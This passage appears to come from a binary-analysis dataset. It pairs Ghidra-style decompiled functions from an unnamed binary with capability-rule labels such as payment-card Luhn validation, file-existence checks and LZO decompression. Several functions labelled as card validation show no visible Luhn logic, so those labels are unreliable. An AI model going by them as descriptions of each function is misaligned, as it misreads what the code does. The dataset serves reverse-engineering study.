*0x15bd8,  *(iVar1 + 0x18) == *0x15bd8)) {\n                iVar2 = 0;\n            }\n            else {\n                iVar2 = (1 - bVar3) - (bVar3 != 0);\n            }\n            if (iVar2 == 0) {\n                iVar2 = fcn.00046f10(*(arg2 + 0x28), *(arg2 + 0x30), 2, *(iVar1 + 0x1a));\n                if (iVar2 != 0) {\ncode_r0x00048494:\n                    *(arg1 + 0x30) = iVar2;\n                    return 0;\n                }\n                *arg3 = 0x472d0;\n                arg3[1] = *(arg2 + 0x30);\n            }\n        }\n    }\n    return 1;\n}\n",
        "token_count": 606
    },
    "0004ce20": {
        "rules": [
            "validate payment card number using luhn algorithm with lookup table/6f7029bc2c134cb690df0e7c2f59f3d4",
            "validate payment card number using luhn algorithm with no lookup table/a90d4ac7cf5b4bde87d45a81715c7353"
        ],
        "decompiled_code": "\nuint64_t fcn.0004ce20(int64_t arg1, int64_t *arg2, int64_t *arg3)\n\n{\n    int32_t iVar1;\n    uint64_t uVar2;\n    int64_t iVar3;\n    \n    if (arg2 == NULL) {\n        uVar2 = 0x21590066;\n    }\n    else if ((arg3 == NULL) || (*arg3 == 0)) {\n        uVar2 = 0x21590067;\n    }\n    else if (arg1 == 0) {\n        iVar3 = fcn.00030cc4(*arg3);\n        *arg2 = iVar3;\n        uVar2 = ~-(iVar3 != 0) & 0x21590004;\n    }\n    else {\n        iVar1 = fcn.00066902(arg1, arg2, 0, arg3, 0x2000, 0x40);\n        if (iVar1 != 0) {\n            *arg2 = 0;\n            uVar2 = fcn.00066902(arg1, arg2, 0, arg3, 0x2000, 0x40);\n            if (uVar2 != 0) {\n                return uVar2;\n            }\n        }\n        uVar2 = fcn.00066902(arg1, arg2, 0, arg3, 0x1000, 0x40);\n    }\n    return uVar2;\n}\n",
        "token_count": 319
    },
    "0004db24": {
        "rules": [
            "validate payment card number using luhn algorithm with lookup table/6f7029bc2c134cb690df0e7c2f59f3d4",
            "validate payment card number using luhn algorithm with no lookup table/a90d4ac7cf5b4bde87d45a81715c7353"
        ],
        "decompiled_code": "\nuint64_t fcn.0004db24(int64_t arg1, int64_t arg2, int64_t arg3)\n\n{\n    uint64_t uVar1;\n    bool bVar2;\n    ulong uStackX8;\n    int64_t iStackX16;\n    int64_t aiStackX24 [2];\n    \n    iStackX16 = arg2;\n    aiStackX24[0] = arg3;\n    if (arg1 == 0) {\n        uStackX8 = *(arg2 + 8);\n    }\n    else {\n        uVar1 = fcn.00030c58(arg1, arg2 + 8, &uStackX8, 8);\n        bVar2 = uVar1 == 0;\n        if (!bVar2) goto code_r0x0004dbd6;\n    }\n    uVar1 = fcn.0004cdec(arg1, aiStackX24[0], &iStackX16, 8);\n    bVar2 = uVar1 == 0;\n    if (bVar2) {\n        uVar1 = fcn.0004cdec(arg1, aiStackX24[0] + 8, &uStackX8, 8);\n        bVar2 = uVar1 == 0;\n        if (bVar2) {\n            uVar1 = fcn.0004cdec(arg1, uStackX8, aiStackX24, 8);\n            bVar2 = uVar1 == 0;\n            if (bVar2) {\n                uVar1 = fcn.0004cdec(arg1, iStackX16 + 8, aiStackX24, 8);\n                bVar2 = uVar1 == 0;\n            }\n        }\n    }\ncode_r0x0004dbd6:\n    return uVar1 & 0xffffffffffffff00 | bVar2;\n}\n",
        "token_count": 413
    },
    "0004dc38": {
        "rules": [
            "validate payment card number using luhn algorithm with lookup table/6f7029bc2c134cb690df0e7c2f59f3d4",
            "validate payment card number using luhn algorithm with no lookup table/a90d4ac7cf5b4bde87d45a81715c7353"
        ],
        "decompiled_code": "\nuint64_t fcn.0004dc38(int64_t arg1, ulong arg2, int64_t arg3)\n\n{\n    uint64_t uVar1;\n    bool bVar2;\n    uint32_t auStackX8 [2];\n    uint32_t auStackX16 [2];\n    uint auStackX24 [4];\n    \n    auStackX24[0] = arg3;\n    auStackX16[0] = arg2;\n    if (arg1 == 0) {\n        auStackX8[0] = *(arg2 + 4);\n    }\n    else {\n        uVar1 = fcn.00030c58(arg1, arg2 + 4, auStackX8, 4);\n        bVar2 = uVar1 == 0;\n        if (!bVar2) goto code_r0x0004dcea;\n    }\n    uVar1 = fcn.0004cdec(arg1, arg3, auStackX16, 4);\n    bVar2 = uVar1 == 0;\n    if (bVar2) {\n        uVar1 = fcn.0004cdec(arg1, arg3 + 4, auStackX8, 4);\n        bVar2 = uVar1 == 0;\n        if (bVar2) {\n            uVar1 = fcn.0004cdec(arg1, auStackX8[0], auStackX24, 4);\n            bVar2 = uVar1 == 0;\n            if (bVar2) {\n                uVar1 = fcn.0004cdec(arg1, auStackX16[0] + 4, auStackX24, 4);\n                bVar2 = uVar1 == 0;\n            }\n        }\n    }\ncode_r0x0004dcea:\n    return uVar1 & 0xffffffffffffff00 | bVar2;\n}\n",
        "token_count": 412
    },
    "0004e0a4": {
        "rules": [
            "validate payment card number using luhn algorithm with lookup table/6f7029bc2c134cb690df0e7c2f59f3d4",
            "validate payment card number using luhn algorithm with no lookup table/a90d4ac7cf5b4bde87d45a81715c7353"
        ],
        "decompiled_code": "\nuint fcn.0004e0a4(ulong arg1, ulong arg2, ulong arg3, ulong arg4)\n\n{\n    uint uVar1;\n    int64_t arg2_00;\n    int64_t iVar2;\n    \n    arg2_00 = fcn.00030c98(0x20a);\n    if (arg2_00 == 0) {\n        uVar1 = 0x21590004;\n    }\n    else {\n        iVar2 = fcn.0006690e(arg2_00, arg2, 0x104);\n        if (iVar2 == -1) {\n            uVar1 = 0x21590066;\n        }\n        else {\n            *(arg2_00 + iVar2 * 2) = 0;\n            uVar1 = fcn.0004d58c(arg1, arg2_00, arg3, arg4);\n        }\n        fcn.00030d24(arg2_00);\n    }\n    return uVar1;\n}\n",
        "token_count": 219
    },
    "0004f464": {
        "rules": [
            "validate payment card number using luhn algorithm with lookup table/6f7029bc2c134cb690df0e7c2f59f3d4",
            "validate payment card number using luhn algorithm with no lookup table/a90d4ac7cf5b4bde87d45a81715c7353"
        ],
        "decompiled_code": "\nulong fcn.0004f464(uint64_t arg1, int64_t arg2)\n\n{\n    ulong uVar1;\n    ulong uStackX16;\n    ulong uStackX24;\n    uchar auStackX32 [8];\n    \n    if (arg2 == 0) {\n        uVar1 = 0x21590066;\n    }\n    else {\n        uVar1 = fcn.0004e71c(arg1, arg2, auStackX32);\n        if (uVar1 == 0) {\n            uVar1 = fcn.0004cf30(&uStackX16, 0x18, arg1 & 0xffffffff);\n            if (uVar1 == 0) {\n                uStackX24 = 0;\n                fcn.00066908(uStackX16, auStackX32, &uStackX24, 0x8000);\n                fcn.000666f2(uStackX16);\n                uVar1 = 0;\n            }\n        }\n    }\n    return uVar1;\n}\n",
        "token_count": 227
    },
    "00051294": {
        "rules": [
            "validate payment card number using luhn algorithm with lookup table/6f7029bc2c134cb690df0e7c2f59f3d4",
            "validate payment card number using luhn algorithm with no lookup table/a90d4ac7cf5b4bde87d45a81715c7353"
        ],
        "decompiled_code": "\nint32_t fcn.00051294(ulong arg1, int64_t arg2, ulong arg3, ulong arg4)\n\n{\n    int32_t iVar1;\n    uchar *puVar2;\n    int64_t arg2_00;\n    int64_t iVar3;\n    int64_t *in_stack_00000028;\n    int32_t aiStack72 [2];\n    int64_t iStack64;\n    \n    iStack64 = 0;\n    puVar2 = fcn.00066824(arg3, 0x2e);\n    if (puVar2 == NULL) {\n        iVar1 = 0x2159000d;\n    }\n    else {\n        *puVar2 = 0;\n        arg2_00 = fcn.00030c98(0x20a);\n        if (arg2_00 == 0) {\n            iVar1 = 0x21590004;\n        }\n        else {\n            aiStack72[0] = 0;\n            while (iVar3 = fcn.0006690e(arg2_00, arg3, 0x104),  iVar3 != -1) {\n                *(arg2_00 + iVar3 * 2) = 0;\n                iVar1 = fcn.0004d8f0(arg1, arg2_00, 0x20a, aiStack72);\n                if (((iVar1 != 0) || (iVar1 = fcn.00050fdc(arg1, arg2_00, &iStack64),  iVar1 != 0)) ||\n                   ((iStack64 != arg2 && (iVar1 = fcn.00051810(arg1, iStack64, puVar2 + 1, arg4),  iVar1 == 0))))\n                goto code_r0x0005138c;\n                if (aiStack72[0] == -1) {\n                    iVar1 = 0x2159000d;\n                    goto code_r0x0005138c;\n                }\n                fcn.00051ffc(arg1, iStack64);\n            }\n            iVar1 = 0x21590066;\ncode_r0x0005138c:\n            fcn.00030d24(arg2_00);\n            if (iVar1 == 0) {\n                *in_stack_00000028 = iStack64;\n            }\n        }\n    }\n    return iVar1;\n}\n",
        "token_count": 513
    },
    "00056b24": {
        "rules": [
            "validate payment card number using luhn algorithm with lookup table/6f7029bc2c134cb690df0e7c2f59f3d4",
            "validate payment card number using luhn algorithm with no lookup table/a90d4ac7cf5b4bde87d45a81715c7353"
        ],
        "decompiled_code": "\nuint64_t fcn.00056b24(ulong arg1, ulong arg2, code *arg3, ulong arg4)\n\n{\n    uint32_t uVar1;\n    uint64_t uVar2;\n    ulong *arg3_00;\n    uchar auStack56 [16];\n    \n    uVar2 = fcn.0001a238();\n    if (uVar2 == 0) {\n        arg3_00 = fcn.00030c98(0x18);\n        if (arg3_00 == NULL) {\n            uVar2 = 0x21590004;\n        }\n        else {\n            *arg3_00 = arg1;\n            arg3_00[1] = arg2;\n            if (arg4 == 0) {\n                LOCK();\n                *0x8d390 = *0x8d390 + 1;\n                uVar1 = fcn.0001a9b0(auStack56, arg3, arg3_00);\n                if (uVar1 != 0) {\n                    fcn.00030d24(arg3_00);\n                    LOCK();\n                    *0x8d390 = *0x8d390 + -1;\n                    return uVar1;\n                }\n                fcn.000327fc(auStack56);\n                fcn.00032710(auStack56);\n            }\n            else {\n                (*arg3)(arg3_00);\n            }\n            uVar2 = 0;\n        }\n    }\n    return uVar2;\n}\n",
        "token_count": 326
    },
    "00056d88": {
        "rules": [
            "validate payment card number using luhn algorithm with lookup table/6f7029bc2c134cb690df0e7c2f59f3d4",
            "validate payment card number using luhn algorithm with no lookup table/a90d4ac7cf5b4bde87d45a81715c7353"
        ],
        "decompiled_code": "\nuint32_t fcn.00056d88(ulong arg1, int64_t arg2, ulong arg3)\n\n{\n    uint32_t uVar1;\n    int32_t iVar2;\n    int64_t arg3_00;\n    uint32_t uStackX16;\n    \n    uVar1 = fcn.00031248(arg2 + 1, 0, 0);\n    iVar2 = fcn.000270f4(3, uVar1, 0, 0);\n    if (iVar2 == 0) {\n        arg3_00 = fcn.00030c98(uStackX16);\n        if (arg3_00 == 0) {\n            uVar1 = 0x21590004;\n        }\n        else {\n            uVar1 = fcn.000270f4(3, uVar1, arg3_00, uStackX16);\n            if (uVar1 == 0) {\n                uVar1 = fcn.00050910(arg1, arg3_00, arg2, arg2);\n            }\n            fcn.00030d24(arg3_00);\n        }\n    }\n    else {\n        uVar1 = iVar2 + 0x191U | 0x21590000;\n    }\n    return uVar1;\n}\n",
        "token_count": 282
    },
    "0005d3cc": {
        "rules": [
            "validate payment card number using luhn algorithm with lookup table/6f7029bc2c134cb690df0e7c2f59f3d4",
            "validate payment card number using luhn algorithm with no lookup table/a90d4ac7cf5b4bde87d45a81715c7353"
        ],
        "decompiled_code": "\nvoid fcn.0005d3cc(ulong arg1, ulong arg2, ulong arg3, ulong arg4)\n\n{\n    int32_t iVar1;\n    uint32_t in_stack_00000028;\n    \n    iVar1 = fcn.0005d348(arg1, arg2, 0);\n    if (iVar1 == 0) {\n        fcn.0005d194(arg1, arg3, arg4, in_stack_00000028);\n    }\n    return;\n}\n",
        "token_count": 107
    },
    "000524e4": {
        "rules": [
            "decompress data using LZO/83f2e70ad753438b83eb63e4275895e9",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.000524e4(int64_t arg1)\n\n{\n    fcn.0005247c(arg1);\n    if (*(arg1 + 0x18) != '\\0') {\n        *(arg1 + 8) = *(arg1 + 8) + -1;\n        *(arg1 + 0x18) = *(arg1 + 0x18) + -1;\n    }\n    return;\n}\n",
        "token_count": 93
    },
    "000182c0": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nvoid fcn.000182c0(void)\n\n{\n    int32_t iVar1;\n    uchar auStackX8 [8];\n    uchar auStackX16 [24];\n    uchar auStack808 [272];\n    uchar auStack536 [528];\n    \n    if (*0x7e1d0 != 0) {\n        iVar1 = fcn.00027418(10, auStack808, 0x104, auStackX8);\n        if (iVar1 == 0) {\n            iVar1 = fcn.0003285c(auStack808, auStack536, 0x104);\n            if (iVar1 != -1) {\n                fcn.00032650(0x7df08, auStackX16, 1);\n                fcn.00066740(0x7dfd0, auStack536, 0x100);\n                *0x7e1d4 = *0x7dfd0 != 0;\n                fcn.00032684(0x7df08, auStackX16, 1);\n            }\n        }\n    }\n    return;\n}\n",
        "token_count": 238
    },
    "0001cf50": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nint32_t fcn.0001cf50(int32_t *arg1, ulong arg2)\n\n{\n    int32_t iVar1;\n    ushort *arg1_00;\n    code *pcVar2;\n    int64_t iVar3;\n    \n    if (*arg1 == -1) {\n        return 0;\n    }\n    arg1_00 = fcn.00030cc4(*(*0x69080 + 0xc));\n    if (arg1_00 == NULL) {\n        iVar1 = -0x3fffff66;\n    }\n    else {\n        fcn.0006670a(arg1_00, *0x7e5c0, *(*0x69080 + 0xc));\n        iVar3 = *(*0x7e5c0 + 0x3c) + *0x7e5c0;\n        iVar1 = fcn.0004d278(arg1_00, (*(iVar3 + 0x30) - *0x7e5c0) + arg1_00);\n        if (iVar1 == 0) {\n            pcVar2 = *(iVar3 + 0x28) + arg1_00;\n            if (pcVar2 == NULL) {\n                iVar1 = -0x3fffffff;\n                goto code_r0x0001d00a;\n            }\n            *(arg1 + 6) = arg1_00;\n            iVar1 = (*pcVar2)(arg1, arg2);\n            if (iVar1 == 0) {\n                *arg1_00 = 0;\n                arg1_00[1] = 0;\n                *(*(arg1_00 + 0x1e) + arg1_00) = 0;\n                iVar1 = -0x3ffffee0;\n            }\n        }\n        if (iVar1 == -0x3ffffee0) {\n            return -0x3ffffee0;\n        }\n    }\ncode_r0x0001d00a:\n    fcn.00030d24(arg1_00);\n    return iVar1;\n}\n",
        "token_count": 447
    },
    "0001e8bc": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nvoid fcn.0001e8bc(ulong arg1)\n\n{\n    int32_t iVar1;\n    int32_t *piVar2;\n    uchar in_DL;\n    uint32_t uVar3;\n    uchar auStackX24 [16];\n    \n    fcn.00032650(0x7eb50, auStackX24, 1);\n    uVar3 = 0;\n    piVar2 = *0x7eb70;\n    if (*0x7eb68 != 0) {\n        do {\n            if (*piVar2 == arg1) break;\n            uVar3 = uVar3 + 1;\n            piVar2 = piVar2 + 2;\n        } while (uVar3 < *0x7eb68);\n        if (uVar3 < *0x7eb68) goto code_r0x0001e954;\n    }\n    iVar1 = fcn.00031630(0x7eb70, *0x7eb68 << 3, *0x7eb68 + 1 << 3);\n    if (iVar1 != -1) {\n        (*0x7eb70)[*0x7eb68 * 2] = arg1;\n        *(*0x7eb70 + *0x7eb68 * 2 + 1) = in_DL;\n        *0x7eb68 = *0x7eb68 + 1;\n    }\ncode_r0x0001e954:\n    fcn.00032684(0x7eb50, auStackX24, 1);\n    return;\n}\n",
        "token_count": 342
    },
    "00021c34": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nint32_t * fcn.00021c34(ulong arg1, ulong arg2, ulong arg3, ulong arg4)\n\n{\n    int32_t iVar1;\n    int32_t *piVar2;\n    int32_t *arg1_00;\n    int64_t in_stack_00000028;\n    int64_t iStack72;\n    uchar auStack64 [32];\n    \n    if (in_stack_00000028 == 0) {\n        piVar2 = 0xffffffff;\n    }\n    else {\n        piVar2 = fcn.00020f54(&iStack72, arg1, 0, auStack64);\n        if (piVar2 == 0) {\n            if ((*(iStack72 + 0x90) != 0) && (arg2 == *(iStack72 + 0x94))) {\n                arg2._0_4_ = *(iStack72 + 0x98);\n            }\n            for (piVar2 = *(iStack72 + 0x38);\n                (arg1_00 = NULL,  piVar2 != NULL && ((*piVar2 != arg2 || (arg1_00 = piVar2,  piVar2[1] != arg3))));\n                piVar2 = *(piVar2 + 8)) {\n            }\n            iVar1 = fcn.00020914(arg1_00, arg4);\n            if (iVar1 == -1) {\n                piVar2 = 0x5;\n            }\n            else {\n                iVar1 = (**(*(iStack72 + 0x58) + 0x28))(*(iStack72 + 0x60), in_stack_00000028, 0x40, iVar1);\n                piVar2 = NULL;\n                if (iVar1 == -1) {\n                    piVar2 = 0x3;\n                }\n            }\n            fcn.000207cc(auStack64);\n        }\n    }\n    return piVar2;\n}\n",
        "token_count": 425
    },
    "00022138": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nulong fcn.00022138(ulong arg1, ulong arg2, ulong arg3, ulong arg4)\n\n{\n    ulong uVar1;\n    ulong in_stack_00000000;\n    ulong in_stack_00000008;\n    ulong in_stack_00000010;\n    ulong in_stack_00000018;\n    ulong in_stack_00000020;\n    ulong in_stack_00000028;\n    ulong in_stack_00000030;\n    ulong in_stack_00000038;\n    ulong in_stack_00000040;\n    ulong in_stack_00000048;\n    ulong in_stack_00000050;\n    ulong in_stack_fffffffffffffff0;\n    ulong in_stack_fffffffffffffff8;\n    \n    if (*0x692c0 == 0xffffffff) {\n        uVar1 = 1;\n    }\n    else {\n        uVar1 = fcn.00021dd8(*0x692c0, arg1, arg2, arg3, arg4, in_stack_fffffffffffffff0, in_stack_fffffffffffffff8, \n                             in_stack_00000000, in_stack_00000008, in_stack_00000010, in_stack_00000018, \n                             in_stack_00000020, in_stack_00000028, in_stack_00000030, in_stack_00000038, \n                             in_stack_00000040, in_stack_00000048, in_stack_00000050);\n    }\n    return uVar1;\n}\n",
        "token_count": 314
    },
    "00022168": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nulong fcn.00022168(ulong arg1, ulong arg2, ulong arg3, ulong arg4)\n\n{\n    ulong uVar1;\n    \n    if (*0x692c0 == 0xffffffff) {\n        uVar1 = 1;\n    }\n    else {\n        uVar1 = fcn.00021d00(*0x692c0, arg1, arg2, arg3);\n    }\n    return uVar1;\n}\n",
        "token_count": 97
    },
    "00022198": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nulong fcn.00022198(ulong arg1, ulong arg2, ulong arg3, ulong arg4)\n\n{\n    ulong uVar1;\n    \n    if (*0x692c0 == 0xffffffff) {\n        uVar1 = 1;\n    }\n    else {\n        uVar1 = fcn.00021c34(*0x692c0, arg1, arg2, arg3);\n    }\n    return uVar1;\n}\n",
        "token_count": 97
    },
    "000221c8": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nulong fcn.000221c8(ulong arg1, ulong arg2, ulong arg3, ulong arg4)\n\n{\n    ulong uVar1;\n    \n    if (*0x692c0 == 0xffffffff) {\n        uVar1 = 1;\n    }\n    else {\n        uVar1 = fcn.00021ae0(*0x692c0, arg1, arg2, arg3);\n    }\n    return uVar1;\n}\n",
        "token_count": 98
    },
    "0002220c": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nulong fcn.0002220c(ulong arg1, ulong arg2, ulong arg3, ulong arg4)\n\n{\n    ulong uVar1;\n    \n    if (*0x692c0 == 0xffffffff) {\n        uVar1 = 1;\n    }\n    else {\n        uVar1 = fcn.0002199c(*0x692c0, arg1, arg2, arg3);\n    }\n    return uVar1;\n}\n",
        "token_count": 98
    },
    "0002225c": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nulong fcn.0002225c(ulong arg1, ulong arg2, ulong arg3)\n\n{\n    ulong uVar1;\n    \n    if (*0x692c0 == 0xffffffff) {\n        uVar1 = 1;\n    }\n    else {\n        uVar1 = fcn.00021644(*0x692c0, arg1, arg2, arg3);\n    }\n    return uVar1;\n}\n",
        "token_count": 93
    },
    "00022288": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nulong fcn.00022288(ulong arg1, ulong arg2)\n\n{\n    ulong uVar1;\n    \n    if (*0x692c0 == 0xffffffff) {\n        uVar1 = 1;\n    }\n    else {\n        uVar1 = fcn.00021708(*0x692c0, arg1, arg2);\n    }\n    return uVar1;\n}\n",
        "token_count": 85
    },
    "000222b4": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nulong fcn.000222b4(ulong arg1, ulong arg2, ulong arg3, ulong arg4)\n\n{\n    ulong uVar1;\n    \n    if (*0x692c0 == 0xffffffff) {\n        uVar1 = 1;\n    }\n    else {\n        uVar1 = fcn.0002181c(*0x692c0, arg1, arg2, arg3);\n    }\n    return uVar1;\n}\n",
        "token_count": 98
    },
    "000222f0": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nulong fcn.000222f0(ulong arg1, ulong arg2, ulong arg3)\n\n{\n    ulong uVar1;\n    \n    if (*0x692c0 == 0xffffffff) {\n        uVar1 = 1;\n    }\n    else {\n        uVar1 = fcn.00021464(*0x692c0, arg1, arg2, arg3);\n    }\n    return uVar1;\n}\n",
        "token_count": 93
    },
    "0002231c": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nulong fcn.0002231c(ulong arg1, ulong arg2, ulong arg3, ulong arg4)\n\n{\n    ulong uVar1;\n    \n    if (*0x692c0 == 0xffffffff) {\n        uVar1 = 1;\n    }\n    else {\n        uVar1 = fcn.00021544(*0x692c0, arg1, arg2, arg3);\n    }\n    return uVar1;\n}\n",
        "token_count": 97
    },
    "000223e0": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nulong fcn.000223e0(ulong arg1, ulong arg2)\n\n{\n    ulong uVar1;\n    \n    if (*0x692c0 == 0xffffffff) {\n        uVar1 = 1;\n    }\n    else {\n        uVar1 = fcn.00021fd4(*0x692c0, arg1, arg2);\n    }\n    return uVar1;\n}\n",
        "token_count": 87
    },
    "000226e8": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nulong fcn.000226e8(ulong arg1, ulong arg2, ulong arg3, ulong arg4)\n\n{\n    ulong uVar1;\n    \n    if (*0x692c0 == 0xffffffff) {\n        uVar1 = 1;\n    }\n    else {\n        uVar1 = fcn.0002260c(*0x692c0, arg1, arg2, arg3);\n    }\n    return uVar1;\n}\n",
        "token_count": 98
    },
    "0002272c": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nulong fcn.0002272c(ulong arg1, ulong arg2, ulong arg3, ulong arg4)\n\n{\n    ulong uVar1;\n    \n    if (*0x692c0 == 0xffffffff) {\n        uVar1 = 1;\n    }\n    else {\n        uVar1 = fcn.00022440(*0x692c0, arg1, arg2, arg3);\n    }\n    return uVar1;\n}\n",
        "token_count": 97
    },
    "00022c10": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nint32_t fcn.00022c10(ulong arg1, ulong arg2)\n\n{\n    int64_t iVar1;\n    int32_t iVar2;\n    \n    if (*0x692c0 == 0xffffffff) {\n        iVar2 = fcn.00022774(arg1, arg2, 0x692c0, *0x692c8);\n        if (iVar2 == 0) {\n            iVar1 = *(*0x692c0 * 8 + 0x8e8d0);\n            *0x7eb98 = iVar1 + 8;\n            *0x7eba0 = *(iVar1 + 0x38);\n        }\n        else {\n            *0x692c0 = 0xffffffff;\n        }\n    }\n    else {\n        iVar2 = -1;\n    }\n    return iVar2;\n}\n",
        "token_count": 183
    },
    "00025ac8": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nulong fcn.00025ac8(int64_t *arg1, uint32_t *arg2, int64_t *arg3)\n\n{\n    int32_t iVar1;\n    uint32_t uVar2;\n    ulong uVar3;\n    int64_t arg3_00;\n    uchar auStack56 [16];\n    \n    *arg3 = 0;\n    iVar1 = fcn.00026fb4(auStack56, 0x10, 0x228);\n    if (iVar1 == 0) {\n        uVar2 = fcn.000201e8(auStack56, 0x10, *arg1, *arg2);\n        if (uVar2 == 0xffffffff) {\n            uVar3 = 0x215901fa;\n        }\n        else {\n            arg3_00 = fcn.00030c98(uVar2);\n            if (arg3_00 == 0) {\n                uVar3 = 0x21590004;\n            }\n            else {\n                fcn.00020210(auStack56, 0x10, arg3_00, *arg1);\n                *arg1 = arg3_00;\n                *arg2 = uVar2;\n                *arg3 = arg3_00;\n                uVar3 = 0;\n            }\n        }\n    }\n    else {\n        uVar3 = 0x215901f9;\n    }\n    return uVar3;\n}\n",
        "token_count": 313
    },
    "0002971c": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nuint32_t fcn.0002971c(ulong arg1, ulong arg2)\n\n{\n    uint32_t uVar1;\n    int32_t iVar2;\n    int64_t arg1_00;\n    int64_t arg1_01;\n    uint64_t uVar3;\n    uint64_t arg1_02;\n    uchar auStack88 [20];\n    uint32_t uStack68;\n    \n    arg1_01 = 0;\n    arg1_00 = fcn.00031698(arg1, 0x11f08);\n    if (arg1_00 != 0) {\n        uVar1 = fcn.00031034(arg1_00);\n        iVar2 = fcn.00031168(uVar1, auStack88);\n        if (iVar2 != -1) {\n            arg1_02 = uStack68;\n            arg1_01 = fcn.00030c98(arg1_02);\n            if (arg1_01 == 0) {\n                uVar1 = 0x21590004;\n                goto code_r0x000297d3;\n            }\n            uVar3 = fcn.00030fb8(arg1_01, 1, arg1_02, arg1_00);\n            if (uVar3 == arg1_02) {\n                iVar2 = fcn.000272c0(3, arg2, arg1_01, uStack68);\n                if (iVar2 == 0) {\n                    uVar1 = 0;\n                }\n                else {\n                    uVar1 = iVar2 + 0x191U | 0x21590000;\n                }\n                goto code_r0x000297d3;\n            }\n        }\n    }\n    uVar1 = fcn.00030eb8();\ncode_r0x000297d3:\n    fcn.00030d24(arg1_01);\n    if (arg1_00 != 0) {\n        fcn.00030f2c(arg1_00);\n    }\n    return uVar1;\n}\n",
        "token_count": 442
    },
    "00031168": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nint32_t fcn.00031168(ulong arg1, int64_t arg2)\n\n{\n    int32_t iVar1;\n    \n    fcn.0006677c(arg2, 0, 0x30);\n    iVar1 = fcn.00031038(arg1);\n    *(arg2 + 0x14) = iVar1;\n    return (iVar1 != -1) - 1;\n}\n",
        "token_count": 90
    },
    "000319f8": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nuint64_t fcn.000319f8(ulong noname_0, int64_t arg2)\n\n{\n    uint32_t uVar1;\n    uint uVar2;\n    uint64_t uVar3;\n    ulong in_R8;\n    ulong in_R9;\n    \n    uVar1 = fcn.0003198c(noname_0, 0, in_R8, in_R9);\n    if (uVar1 == 0xffffffff) {\n        uVar3 = uVar1 & 0xffffffff;\n    }\n    else {\n        fcn.0006677c(arg2, 0, 0x30);\n        uVar2 = fcn.00031038(uVar1);\n        *(arg2 + 0x14) = uVar2;\n        fcn.000666f2(uVar1);\n        uVar3 = (*(arg2 + 0x14) != -1) - 1;\n    }\n    return uVar3;\n}\n",
        "token_count": 210
    },
    "00031e0c": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
